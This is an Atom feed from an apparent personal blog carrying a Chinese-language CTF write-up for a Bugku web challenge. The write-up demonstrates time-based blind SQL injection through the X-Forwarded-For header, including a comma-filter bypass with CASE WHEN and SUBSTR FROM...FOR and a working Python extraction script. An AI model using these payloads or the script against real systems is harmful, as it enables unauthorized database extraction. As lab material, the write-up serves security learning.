<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>WWW</title>
  
  <subtitle>W&#39;Note</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://dddwmr.github.io/"/>
  <updated>2019-08-25T08:34:47.992Z</updated>
  <id>http://dddwmr.github.io/</id>
  
  <author>
    <name>ddd_wmr</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>insert into</title>
    <link href="http://dddwmr.github.io/2019/08/24/insert%20into/"/>
    <id>http://dddwmr.github.io/2019/08/24/insert into/</id>
    <published>2019-08-24T00:00:00.000Z</published>
    <updated>2019-08-25T08:34:47.992Z</updated>
    
    <content type="html"><![CDATA[<h1 id="insert-into"><a href="#insert-into" class="headerlink" title="insert into"></a>insert into</h1><img src="/2019/08/24/insert%20into/1-01.png" title="image"><p>观察题目</p><img src="/2019/08/24/insert%20into/1-02.png" title="image"><p>可以看到注入点应该在http头的x-forwarded-for上</p><img src="/2019/08/24/insert%20into/1-03.png" title="image"><p>这里还把‘，’过滤了</p><img src="/2019/08/24/insert%20into/1-04.png" title="image"><p>因为把，过滤了 if是用不了<br>这里用select case when..then..else..end代替<br>substr也用不了 但是可以用 from 1 for 1代替<br>为了节约时间，可以先手工查字段长度<br>这里以database()做示范:</p><p><strong>x-forwarded-for:1’ and case when(length((select database()))&lt;6) then sleep(3) else 0 end and ‘a</strong></p><img src="/2019/08/24/insert%20into/1-05.png" title="image"><p>可以看到右下的时间，延时了证明条件成立，最后测出database（）的长度为5，其他数据长度也这样测出来。还是以database()为例，如果单个字符测具体字段：<br><strong>x-forwarded-for:1’ and case when(substr((select database()) from 1 for 1)=’w’) then sleep(3) else 0 end and ‘a</strong></p><img src="/2019/08/24/insert%20into/1-06.png" title="image"><p>当然转成ascii码用二分法更有效率<br>但为了更加方便 这里写一个脚本</p><pre class=" language-python"><code class="language-python"> !<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>python<span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span> coding<span class="token punctuation">:</span> UTF<span class="token number">-8</span> <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringmystring <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token comment" spellcheck="true">#所有字母和数字的集合</span>url<span class="token operator">=</span><span class="token string">'http://123.206.87.240:8002/web15/'</span><span class="token comment" spellcheck="true">#查库名</span>data <span class="token operator">=</span> <span class="token string">"127.0.0.1'+(select case when (substring((database()) from {0} for 1)='{1}') then sleep(5) else 1 end) and '1'='1"</span>  <span class="token comment" spellcheck="true">#这里的{0}对应的是后面所需要的format里的str[i](str应该是database()) 查出来是web15</span><span class="token comment" spellcheck="true">#查表名</span>data <span class="token operator">=</span> <span class="token string">"1'+(case when (substring((select group_concat(table_name) from information_schema.tables where table_schema=database()) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1"</span><span class="token comment" spellcheck="true">#查出来时clineip和flag</span><span class="token comment" spellcheck="true">#查字段名</span>data <span class="token operator">=</span> <span class="token string">"1'+(case when (substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and     table_name='flag') from {0} for 1)='{1}') then sleep(4) else 1 end) and '1"</span><span class="token comment" spellcheck="true">#查出来是 flag</span><span class="token comment" spellcheck="true">#查内容</span>data<span class="token operator">=</span> <span class="token string">"1'+(case when(substring((select flag from flag) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1 "</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#之前得到database()长度为5，但由于substr默认从1开始，所以range设置为1-6 (1,2,3,4,5) 如果不想查把长度设置大一点既可以</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> mystring<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>          headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'x-forwarded-for'</span><span class="token punctuation">:</span>data<span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#format格式化输出，把查到的str的每一字符依次赋到{0}里去</span>          res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#一旦延时超过3s，继续向下执行代码</span>        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ReadTimeout<span class="token punctuation">:</span><span class="token comment" spellcheck="true">#跳到这里执行，得到所求</span>          flag <span class="token operator">+=</span> j          <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>          <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'The final flag:'</span><span class="token operator">+</span>flag<span class="token punctuation">)</span></code></pre><p>由于延时不是很稳定 所以很容易出错 多试几次才能有正确答案flag{cdbf14c9551d5be5612f7bb5d2867853}<br>（最好每次只开一个运行 不然出错概率太大）</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;insert-into&quot;&gt;&lt;a href=&quot;#insert-into&quot; class=&quot;headerlink&quot; title=&quot;insert into&quot;&gt;&lt;/a&gt;insert into&lt;/h1&gt;&lt;img src=&quot;/2019/08/24/insert%20into/1
      
    
    </summary>
    
      <category term="ctfweb" scheme="http://dddwmr.github.io/categories/ctfweb/"/>
    
    
      <category term="bugku" scheme="http://dddwmr.github.io/tags/bugku/"/>
    
      <category term="sql注入" scheme="http://dddwmr.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
